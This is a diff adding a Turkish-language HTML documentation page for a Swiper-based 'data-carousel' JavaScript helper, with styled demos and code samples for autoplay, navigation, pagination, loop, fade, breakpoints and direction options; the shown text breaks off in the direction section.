@@ -1,0 +1,1209 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Data Carousel — Dokümantasyon</title>
+   <link rel="shortcut icon" href="favicon.png" type="image/x-icon" />
+   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css">
+   <style>
+      :root {
+         --bg: #0f1117;
+         --surface: #1a1d27;
+         --surface-2: #232734;
+         --border: #2e3348;
+         --text: #e2e4ed;
+         --text-muted: #8b8fa7;
+         --accent: #6c8aff;
+         --accent-hover: #8da5ff;
+         --green: #4ade80;
+         --orange: #fb923c;
+         --red: #f87171;
+         --code-bg: #141620;
+         --radius: 10px;
+      }
+
+      * {
+         box-sizing: border-box;
+         margin: 0;
+         padding: 0;
+      }
+
+      body {
+         font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+         background: var(--bg);
+         color: var(--text);
+         line-height: 1.65;
+         padding: 0;
+      }
+
+      /* ── Layout ── */
+      .wrapper {
+         max-width: 960px;
+         margin: 0 auto;
+         padding: 3rem 1.5rem 6rem;
+      }
+
+      /* ── Hero ── */
+      .hero {
+         text-align: center;
+         margin-bottom: 4rem;
+         padding: 3rem 1rem;
+         border-bottom: 1px solid var(--border);
+      }
+
+      .hero h1 {
+         font-size: 2.6rem;
+         font-weight: 700;
+         letter-spacing: -0.03em;
+         margin-bottom: 0.5rem;
+      }
+
+      .hero h1 span {
+         color: var(--accent);
+      }
+
+      .hero p {
+         color: var(--text-muted);
+         font-size: 1.15rem;
+         max-width: 600px;
+         margin: 0 auto;
+      }
+
+      /* ── TOC ── */
+      .toc {
+         background: var(--surface);
+         border: 1px solid var(--border);
+         border-radius: var(--radius);
+         padding: 1.5rem 2rem;
+         margin-bottom: 3rem;
+      }
+
+      .toc h2 {
+         font-size: 1rem;
+         text-transform: uppercase;
+         letter-spacing: 0.08em;
+         color: var(--text-muted);
+         margin-bottom: 1rem;
+      }
+
+      .toc ul {
+         list-style: none;
+         display: grid;
+         grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+         gap: 0.4rem 2rem;
+      }
+
+      .toc a {
+         color: var(--accent);
+         text-decoration: none;
+         font-size: 0.95rem;
+         transition: color 0.2s;
+      }
+
+      .toc a:hover {
+         color: var(--accent-hover);
+         text-decoration: underline;
+      }
+
+      /* ── Section ── */
+      .section {
+         margin-bottom: 3.5rem;
+      }
+
+      .section-header {
+         display: flex;
+         align-items: center;
+         gap: 0.75rem;
+         margin-bottom: 0.5rem;
+      }
+
+      .section-header h2 {
+         font-size: 1.5rem;
+         font-weight: 600;
+      }
+
+      .badge {
+         display: inline-block;
+         font-size: 0.7rem;
+         font-weight: 600;
+         text-transform: uppercase;
+         letter-spacing: 0.06em;
+         padding: 0.2rem 0.6rem;
+         border-radius: 999px;
+         background: var(--accent);
+         color: var(--bg);
+      }
+
+      .section>p {
+         color: var(--text-muted);
+         margin-bottom: 1.25rem;
+         max-width: 700px;
+      }
+
+      /* ── Syntax ── */
+      .syntax {
+         background: var(--code-bg);
+         border: 1px solid var(--border);
+         border-radius: var(--radius);
+         padding: 0.5rem 1rem;
+         margin-bottom: 1.25rem;
+         font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+         font-size: 0.88rem;
+         color: var(--orange);
+         overflow-x: auto;
+      }
+
+      /* ── Demo Card ── */
+      .demo-card {
+         background: var(--surface);
+         border: 1px solid var(--border);
+         border-radius: var(--radius);
+         overflow: hidden;
+         margin-bottom: 1rem;
+      }
+
+      .demo-area {
+         padding: 2rem;
+         display: flex;
+         flex-wrap: wrap;
+         align-items: center;
+         gap: 1rem;
+         min-height: 80px;
+         position: relative;
+      }
+
+      .demo-area.column {
+         flex-direction: column;
+         align-items: flex-start;
+      }
+
+      .code-block {
+         background: var(--code-bg);
+         border-top: 1px solid var(--border);
+         padding: 1rem 1.25rem;
+         overflow-x: auto;
+         position: relative;
+      }
+
+      .code-block pre {
+         font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+         font-size: 0.82rem;
+         line-height: 1.7;
+         color: var(--text-muted);
+         white-space: pre;
+         margin: 0;
+      }
+
+      .code-block .tag {
+         color: var(--red);
+      }
+
+      .code-block .attr {
+         color: var(--orange);
+      }
+
+      .code-block .str {
+         color: var(--green);
+      }
+
+      .code-block .cmt {
+         color: #555b78;
+         font-style: italic;
+      }
+
+      .code-label {
+         display: inline-block;
+         font-size: 0.7rem;
+         font-weight: 600;
+         text-transform: uppercase;
+         letter-spacing: 0.06em;
+         color: var(--text-muted);
+         margin-bottom: 0.5rem;
+      }
+
+      /* ── Notes ── */
+      .note {
+         background: #1a1d27;
+         border-left: 3px solid var(--accent);
+         padding: 0.8rem 1rem;
+         border-radius: 0 var(--radius) var(--radius) 0;
+         margin-top: 1rem;
+         font-size: 0.85rem;
+         color: var(--text-muted);
+      }
+
+      .note strong {
+         color: var(--text);
+      }
+
+      /* ── Carousel Demo Overrides ── */
+      .carousel-demo-wrapper {
+         width: 100%;
+         max-width: 500px;
+         position: relative;
+      }
+
+      .carousel-demo-wrapper .swiper {
+         border-radius: 8px;
+         overflow: hidden;
+      }
+
+      .carousel-demo-wrapper .swiper-slide {
+         display: flex;
+         align-items: center;
+         justify-content: center;
+         height: 180px;
+         border-radius: 8px;
+         font-size: 1.1rem;
+         font-weight: 600;
+         color: var(--text);
+      }
+
+      .carousel-demo-wrapper .swiper-slide:nth-child(1) { background: linear-gradient(135deg, #6c8aff 0%, #4a6cf7 100%); }
+      .carousel-demo-wrapper .swiper-slide:nth-child(2) { background: linear-gradient(135deg, #4ade80 0%, #22c55e 100%); }
+      .carousel-demo-wrapper .swiper-slide:nth-child(3) { background: linear-gradient(135deg, #fb923c 0%, #f97316 100%); }
+      .carousel-demo-wrapper .swiper-slide:nth-child(4) { background: linear-gradient(135deg, #f87171 0%, #ef4444 100%); }
+      .carousel-demo-wrapper .swiper-slide:nth-child(5) { background: linear-gradient(135deg, #a78bfa 0%, #8b5cf6 100%); }
+
+      .demo-nav-btn {
+         display: inline-flex;
+         align-items: center;
+         gap: 0.4rem;
+         padding: 0.45rem 1rem;
+         border-radius: 8px;
+         border: 1px solid var(--border);
+         background: var(--surface-2);
+         color: var(--text);
+         font-size: 0.85rem;
+         font-weight: 500;
+         cursor: pointer;
+         transition: all 0.2s;
+         user-select: none;
+      }
+
+      .demo-nav-btn:hover {
+         border-color: var(--accent);
+         background: #2a2e42;
+      }
+
+      .demo-pagination {
+         margin-top: 0.75rem;
+      }
+
+      .demo-pagination .swiper-pagination-bullet {
+         background: var(--text-muted);
+         opacity: 0.5;
+         width: 8px;
+         height: 8px;
+         transition: all 0.2s;
+      }
+
+      .demo-pagination .swiper-pagination-bullet-active {
+         background: var(--accent);
+         opacity: 1;
+         width: 20px;
+         border-radius: 4px;
+      }
+
+      .swiper-button-next,
+      .swiper-button-prev {
+         color: var(--accent) !important;
+         width: 32px !important;
+         height: 32px !important;
+      }
+
+      .swiper-button-next::after,
+      .swiper-button-prev::after {
+         font-size: 16px !important;
+         font-weight: 700;
+      }
+
+      /* Fade demo */
+      .fade-demo .swiper-slide {
+         height: 200px;
+      }
+
+      /* Vertical demo */
+      .vertical-demo {
+         height: 200px !important;
+      }
+
+      .vertical-demo .swiper-slide {
+         height: 200px !important;
+      }
+
+      /* Multi-slide demo */
+      .multi-demo .swiper-slide {
+         height: 140px;
+         font-size: 0.95rem;
+      }
+
+      /* ── Responsive ── */
+      @media (max-width: 640px) {
+         .hero h1 {
+            font-size: 1.8rem;
+         }
+
+         .wrapper {
+            padding: 2rem 1rem 4rem;
+         }
+
+         .toc ul {
+            grid-template-columns: 1fr;
+         }
+      }
+
+      /* ── Footer ── */
+      .footer {
+         text-align: center;
+         padding: 2rem 0;
+         border-top: 1px solid var(--border);
+         margin-top: 2rem;
+         color: var(--text-muted);
+         font-size: 0.82rem;
+      }
+   </style>
+</head>
+
+<body>
+   <div class="wrapper">
+
+      <!-- ════════════ HERO ════════════ -->
+      <header class="hero">
+         <h1><span>data-carousel</span>.js</h1>
+         <p>Swiper tabanlı, yapılandırılabilir carousel yöneticisi. Tek bir <code>data-carousel</code> attribute ile autoplay, loop, fade, pagination, navigation, parallax ve breakpoints desteği.</p>
+      </header>
+
+      <!-- ════════════ TOC ════════════ -->
+      <nav class="toc">
+         <h2>İçindekiler</h2>
+         <ul>
+            <li><a href="#basic">Temel Kullanım</a></li>
+            <li><a href="#autoplay">autoplay — Otomatik Kaydırma</a></li>
+            <li><a href="#navigation">navigation — İleri/Geri Butonları</a></li>
+            <li><a href="#pagination">pagination — Sayfalama</a></li>
+            <li><a href="#loop">loop — Sonsuz Döngü</a></li>
+            <li><a href="#fade">fadeEffect — Geçiş Efekti</a></li>
+            <li><a href="#breakpoints">breakpoints — Responsive Ayarlar</a></li>
+            <li><a href="#direction">direction — Yön Ayarı</a></li>
+            <li><a href="#combined">Birleşik Örnekler</a></li>
+            <li><a href="#params">Parametre Referans Tablosu</a></li>
+            <li><a href="#architecture">Mimari ve Teknik Detaylar</a></li>
+         </ul>
+      </nav>
+
+      <!-- ═══════════════════════════════════════════════
+           1. BASIC USAGE
+      ═══════════════════════════════════════════════ -->
+      <section id="basic" class="section">
+         <div class="section-header">
+            <h2>Temel Kullanım</h2>
+            <span class="badge">Temel</span>
+         </div>
+         <p>Carousel oluşturmak için elemana <code>.carousel</code> class'ı ve <code>data-carousel</code> attribute'u eklenir. İçerik standart Swiper yapısını (wrapper + slide) kullanır. Yapılandırma <code>key:value</code> çiftleri halinde virgülle ayrılarak yazılır.</p>
+
+         <div class="syntax"><code>data-carousel="speed:750"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="carousel-demo-wrapper">
+                  <div class="swiper carousel" data-carousel="speed:750" data-carousel-id="basic-demo">
+                     <div class="swiper-wrapper">
+                        <div class="swiper-slide">Slide 1</div>
+                        <div class="swiper-slide">Slide 2</div>
+                        <div class="swiper-slide">Slide 3</div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- Temel carousel yapısı --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper carousel"</span>
+     <span class="attr">data-carousel</span>=<span class="str">"speed:750"</span>
+     <span class="attr">data-carousel-id</span>=<span class="str">"c1"</span><span class="tag">&gt;</span>
+
+   <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-wrapper"</span><span class="tag">&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>Slide 1<span class="tag">&lt;/div&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>Slide 2<span class="tag">&lt;/div&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>Slide 3<span class="tag">&lt;/div&gt;</span>
+   <span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>Swiper bağımlılığı:</strong> <code>data-carousel</code>, Swiper kütüphanesi üzerine inşa edilmiştir. Swiper'ın CSS ve JS dosyalarının sayfaya dahil edilmesi gerekir. Script, gerekli modülleri (<code>Autoplay</code>, <code>Pagination</code>, <code>Navigation</code>, <code>EffectFade</code>, <code>Parallax</code>) config'e göre otomatik olarak yükler.
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>data-carousel-id:</strong> Her carousel'e benzersiz bir ID atanır. Bu ID, harici navigation/pagination elemanlarını carousel ile eşleştirmek için kullanılır. Belirtilmezse otomatik olarak <code>carousel-0</code>, <code>carousel-1</code> şeklinde atanır.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           2. AUTOPLAY
+      ═══════════════════════════════════════════════ -->
+      <section id="autoplay" class="section">
+         <div class="section-header">
+            <h2>autoplay:&lt;ms&gt;</h2>
+            <span class="badge">Zamanlama</span>
+         </div>
+         <p>Slide'lar arasında otomatik geçiş sağlar. Değer milisaniye cinsinden gecikme süresini belirtir. Mouse üzerine gelince otomatik duraklar, etkileşim bitince devam eder.</p>
+
+         <div class="syntax"><code>data-carousel="autoplay:3000"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="carousel-demo-wrapper">
+                  <div class="swiper carousel" data-carousel="autoplay:3000, speed:600" data-carousel-id="autoplay-demo">
+                     <div class="swiper-wrapper">
+                        <div class="swiper-slide">Slide 1 — 3sn arayla değişir</div>
+                        <div class="swiper-slide">Slide 2 — Mouse ile duraklatılır</div>
+                        <div class="swiper-slide">Slide 3 — Etkileşim sonrası devam eder</div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- 3 saniye arayla otomatik geçiş --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper carousel"</span>
+     <span class="attr">data-carousel</span>=<span class="str">"autoplay:3000, speed:600"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-wrapper"</span><span class="tag">&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+   <span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- 5 saniye arayla --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper carousel"</span>
+     <span class="attr">data-carousel</span>=<span class="str">"autoplay:5000"</span><span class="tag">&gt;</span>
+   ...
+<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>pauseOnMouseEnter:</strong> Autoplay aktifken mouse carousel üzerine geldiğinde otomatik geçiş duraklar. Mouse çekildiğinde kaldığı yerden devam eder.
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>disableOnInteraction:</strong> Kullanıcı elle kaydırdığında autoplay devre dışı kalmaz — etkileşim sonrası otomatik olarak devam eder.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           3. NAVIGATION
+      ═══════════════════════════════════════════════ -->
+      <section id="navigation" class="section">
+         <div class="section-header">
+            <h2>navigation</h2>
+            <span class="badge">Kontrol</span>
+         </div>
+         <p>İleri/geri butonları ile slide geçişi sağlar. Butonlar <code>data-carousel-id</code> ile carousel'e bağlanır. Butonlara <code>.carousel-prev</code> ve <code>.carousel-next</code> class'ları verilir.</p>
+
+         <div class="syntax"><code>data-carousel="navigation:true"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="carousel-demo-wrapper">
+                  <div class="swiper carousel" data-carousel="navigation:true, speed:500" data-carousel-id="nav-demo">
+                     <div class="swiper-wrapper">
+                        <div class="swiper-slide">Slide 1</div>
+                        <div class="swiper-slide">Slide 2</div>
+                        <div class="swiper-slide">Slide 3</div>
+                        <div class="swiper-slide">Slide 4</div>
+                     </div>
+                  </div>
+                  <div style="display:flex;gap:0.5rem;margin-top:0.75rem">
+                     <button class="demo-nav-btn carousel-prev" data-carousel-id="nav-demo">← Önceki</button>
+                     <button class="demo-nav-btn carousel-next" data-carousel-id="nav-demo">Sonraki →</button>
+                  </div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper carousel"</span>
+     <span class="attr">data-carousel</span>=<span class="str">"navigation:true"</span>
+     <span class="attr">data-carousel-id</span>=<span class="str">"c1"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-wrapper"</span><span class="tag">&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+   <span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- data-carousel-id ile carousel'e bağlanan butonlar --&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">class</span>=<span class="str">"carousel-prev"</span> <span class="attr">data-carousel-id</span>=<span class="str">"c1"</span><span class="tag">&gt;</span>← Önceki<span class="tag">&lt;/button&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">class</span>=<span class="str">"carousel-next"</span> <span class="attr">data-carousel-id</span>=<span class="str">"c1"</span><span class="tag">&gt;</span>Sonraki →<span class="tag">&lt;/button&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>ID eşleşmesi:</strong> Navigation butonlarındaki <code>data-carousel-id</code> değeri, carousel elemanındaki <code>data-carousel-id</code> ile aynı olmalıdır. Script otomatik olarak eşleşen butonları bulur ve Swiper'a bağlar.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           4. PAGINATION
+      ═══════════════════════════════════════════════ -->
+      <section id="pagination" class="section">
+         <div class="section-header">
+            <h2>pagination</h2>
+            <span class="badge">Kontrol</span>
+         </div>
+         <p>Slide sayısını ve mevcut konumu gösteren sayfalama noktaları ekler. Pagination elemanı <code>data-carousel-id</code> ile carousel'e bağlanır. Tıklanarak doğrudan slide'a geçiş yapılabilir.</p>
+
+         <div class="syntax"><code>data-carousel="pagination:true"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="carousel-demo-wrapper">
+                  <div class="swiper carousel" data-carousel="pagination:true, speed:500" data-carousel-id="pag-demo">
+                     <div class="swiper-wrapper">
+                        <div class="swiper-slide">Slide 1</div>
+                        <div class="swiper-slide">Slide 2</div>
+                        <div class="swiper-slide">Slide 3</div>
+                        <div class="swiper-slide">Slide 4</div>
+                        <div class="swiper-slide">Slide 5</div>
+                     </div>
+                  </div>
+                  <div class="demo-pagination carousel-pagination" data-carousel-id="pag-demo"></div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper carousel"</span>
+     <span class="attr">data-carousel</span>=<span class="str">"pagination:true"</span>
+     <span class="attr">data-carousel-id</span>=<span class="str">"c1"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-wrapper"</span><span class="tag">&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+   <span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;/div&gt;</span>
+
+<span class="cmt">&lt;!-- Pagination container --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"carousel-pagination"</span> <span class="attr">data-carousel-id</span>=<span class="str">"c1"</span><span class="tag">&gt;&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>paginationType:</strong> Varsayılan tip <code>bullets</code>'tır. Alternatif tipler: <code>fraction</code> (1/5 formatı), <code>progressbar</code> (ilerleme çubuğu). Kullanım: <code>paginationType:fraction</code>
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>Clickable:</strong> Pagination noktaları varsayılan olarak tıklanabilirdir — doğrudan ilgili slide'a geçiş yapar.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           5. LOOP
+      ═══════════════════════════════════════════════ -->
+      <section id="loop" class="section">
+         <div class="section-header">
+            <h2>loop</h2>
+            <span class="badge">Davranış</span>
+         </div>
+         <p>Son slide'dan sonra ilk slide'a dönerek sonsuz döngü oluşturur. Autoplay ile birlikte kesintisiz slider deneyimi sağlar.</p>
+
+         <div class="syntax"><code>data-carousel="loop:true"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="carousel-demo-wrapper">
+                  <div class="swiper carousel" data-carousel="loop:true, navigation:true, speed:500" data-carousel-id="loop-demo">
+                     <div class="swiper-wrapper">
+                        <div class="swiper-slide">Slide 1</div>
+                        <div class="swiper-slide">Slide 2</div>
+                        <div class="swiper-slide">Slide 3</div>
+                     </div>
+                  </div>
+                  <div style="display:flex;gap:0.5rem;margin-top:0.75rem">
+                     <button class="demo-nav-btn carousel-prev" data-carousel-id="loop-demo">← Önceki</button>
+                     <button class="demo-nav-btn carousel-next" data-carousel-id="loop-demo">Sonraki →</button>
+                  </div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- Sonsuz döngü --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper carousel"</span>
+     <span class="attr">data-carousel</span>=<span class="str">"loop:true, navigation:true"</span>
+     <span class="attr">data-carousel-id</span>=<span class="str">"c1"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-wrapper"</span><span class="tag">&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+   <span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>loopAdditionalSlides:</strong> Loop modunda ekstra klonlanacak slide sayısı. Performans veya görsel geçiş sorunlarında artırılabilir: <code>loopAdditionalSlides:2</code>
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           6. FADE EFFECT
+      ═══════════════════════════════════════════════ -->
+      <section id="fade" class="section">
+         <div class="section-header">
+            <h2>fadeEffect</h2>
+            <span class="badge">Görsel</span>
+         </div>
+         <p>Slide geçişlerinde kaydırma yerine solma (fade) efekti kullanır. <code>crossFade: true</code> otomatik aktif olur — giden ve gelen slide'lar üst üste yumuşak geçiş yapar.</p>
+
+         <div class="syntax"><code>data-carousel="fadeEffect:true"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="carousel-demo-wrapper fade-demo">
+                  <div class="swiper carousel" data-carousel="fadeEffect:true, autoplay:2500, speed:800, loop:true" data-carousel-id="fade-demo">
+                     <div class="swiper-wrapper">
+                        <div class="swiper-slide">Fade Slide 1</div>
+                        <div class="swiper-slide">Fade Slide 2</div>
+                        <div class="swiper-slide">Fade Slide 3</div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- Fade geçiş efekti ile autoplay --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper carousel"</span>
+     <span class="attr">data-carousel</span>=<span class="str">"fadeEffect:true, autoplay:2500, speed:800, loop:true"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-wrapper"</span><span class="tag">&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+   <span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>crossFade:</strong> Fade efekti aktifleştirildiğinde <code>crossFade: true</code> otomatik olarak uygulanır. Bu sayede giden slide kaybolurken gelen slide aynı anda belirmeye başlar — boşluk oluşmaz.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           7. BREAKPOINTS
+      ═══════════════════════════════════════════════ -->
+      <section id="breakpoints" class="section">
+         <div class="section-header">
+            <h2>breakpoints</h2>
+            <span class="badge">Responsive</span>
+         </div>
+         <p>Ekran boyutuna göre farklı yapılandırmalar tanımlar. <code>data-carousel-breakpoints</code> attribute'u ile JSON formatında responsive ayarlar yazılır. Her breakpoint Swiper'ın desteklediği tüm parametreleri kabul eder.</p>
+
+         <div class="syntax"><code>data-carousel-breakpoints='{"768": {"slidesPerView": 2}, "1024": {"slidesPerView": 3}}'</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="carousel-demo-wrapper multi-demo" style="max-width:100%">
+                  <div class="swiper carousel" data-carousel="speed:500, pagination:true" data-carousel-id="bp-demo" data-carousel-breakpoints='{"0": {"slidesPerView": 1, "spaceBetween": 10}, "480": {"slidesPerView": 2, "spaceBetween": 15}, "768": {"slidesPerView": 3, "spaceBetween": 20}}'>
+                     <div class="swiper-wrapper">
+                        <div class="swiper-slide">Slide 1</div>
+                        <div class="swiper-slide">Slide 2</div>
+                        <div class="swiper-slide">Slide 3</div>
+                        <div class="swiper-slide">Slide 4</div>
+                        <div class="swiper-slide">Slide 5</div>
+                     </div>
+                  </div>
+                  <div class="demo-pagination carousel-pagination" data-carousel-id="bp-demo"></div>
+               </div>
+               <span style="font-size:0.82rem;color:var(--text-muted)">Pencere genişliği: <span id="window-width"></span>px — Boyutu değiştirerek slide sayısını gözlemleyin</span>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper carousel"</span>
+     <span class="attr">data-carousel</span>=<span class="str">"speed:500, pagination:true"</span>
+     <span class="attr">data-carousel-id</span>=<span class="str">"c1"</span>
+     <span class="attr">data-carousel-breakpoints</span>=<span class="str">'{"768": {"slidesPerView": 2, "spaceBetween": 15},
+                                  "1024": {"slidesPerView": 3, "spaceBetween": 20}}'</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-wrapper"</span><span class="tag">&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+   <span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;/div&gt;</span>
+
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"carousel-pagination"</span> <span class="attr">data-carousel-id</span>=<span class="str">"c1"</span><span class="tag">&gt;&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>JSON formatı:</strong> Breakpoints değeri geçerli bir JSON string olmalıdır. Attribute'ta tek tırnak (<code>'</code>) kullanılarak iç JSON'daki çift tırnaklarla çakışma önlenir. Geçersiz JSON durumunda konsola uyarı yazılır ve breakpoints yok sayılır.
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>Key normalleştirme:</strong> Breakpoint key'leri otomatik olarak sayıya dönüştürülür. <code>"768"</code> string'i <code>768</code> number'a çevrilir — Swiper uyumluluğu garanti edilir.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           8. DIRECTION
+      ═══════════════════════════════════════════════ -->
+      <section id="direction" class="section">
+         <div class="section-header">
+            <h2>direction</h2>
+            <span class="badge">Düzen</span>
+         </div>
+         <p>Carousel'in kaydırma yönünü belirler. Varsayılan <code>horizontal</code>'dır. Dikey slider'lar için <code>vertical</code> kullanılır.</p>
+
+         <div class="syntax"><code>data-carousel="direction:vertical"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="carousel-demo-wrapper">
+                  <div class="swiper carousel vertical-demo" data-carousel="direction:vertical, speed:600, loop:true, navigation:true" data-carousel-id="dir-demo" style="height:200px">
+                     <div class="swiper-wrapper">
+                        <div class="swiper-slide">Dikey Slide 1 ↕</div>
+                        <div class="swiper-slide">Dikey Slide 2 ↕</div>
+                        <div class="swiper-slide">Dikey Slide 3 ↕</div>
+                     </div>
+                  </div>
+                  <div style="display:flex;gap:0.5rem;margin-top:0.75rem">
+                     <button class="demo-nav-btn carousel-prev" data-carousel-id="dir-demo">↑ Yukarı</button>
+                     <button class="demo-nav-btn carousel-next" data-carousel-id="dir-demo">Aşağı ↓</button>
+                  </div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- Dikey carousel --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper carousel"</span>
+     <span class="attr">data-carousel</span>=<span class="str">"direction:vertical, loop:true, navigation:true"</span>
+     <span class="attr">data-carousel-id</span>=<span class="str">"c1"</span>
+     <span class="attr">style</span>=<span class="str">"height: 300px"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-wrapper"</span><span class="tag">&gt;</span>
